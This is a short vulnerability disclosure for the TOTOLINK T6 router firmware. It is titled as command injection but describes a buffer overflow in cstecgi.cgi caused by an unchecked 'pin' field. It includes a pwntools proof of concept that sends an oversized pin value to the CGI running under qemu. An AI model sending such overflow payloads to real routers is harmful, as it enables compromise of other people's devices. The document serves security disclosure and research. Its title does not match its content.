# Command Injection

## TOTOLINK_T6

version: V4.1.5cu.709_B20210518

## Description:

There is a buf overflow  in cstecgi.cgi

## Source:

you may download it from : http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36

## Analyse:



in sub_421AA0, v7 get from pin,and then pass to v16 , but dont check the length.

![](3.png)


finally ,cause overflow.


## POC

```
from pwn import *
import json

data = {
    "topicurl": "setting/setWiFiWpsStart",
    "wscMode": "1",
    "pin": b'a'*0x200 
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mipsel-static",
    "-g", "1234",
    "-L", "./root/",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.0.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)
a.sendline(data.encode())

a.interactive()
```
